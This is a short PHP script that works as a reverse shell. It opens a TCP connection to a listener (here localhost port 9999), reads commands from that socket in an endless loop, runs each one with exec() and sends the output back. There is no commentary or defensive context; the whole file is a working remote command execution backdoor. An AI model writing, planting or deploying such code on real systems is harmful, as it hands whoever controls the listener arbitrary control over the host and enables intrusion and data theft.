<?php
$server=socket_create(AF_INET,SOCK_STREAM,0);
socket_connect($server,"localhost",9999);
while(1){
    $cmd=socket_read($server,1024);
    echo $cmd."\n";
    print(strpos($cmd,'cd'));
    $stdout=null;
    $stderr=null;
    $execution=exec($cmd." 2>&1",$stdout,$stderr);
    socket_write($server,implode("\n",$stdout));
}
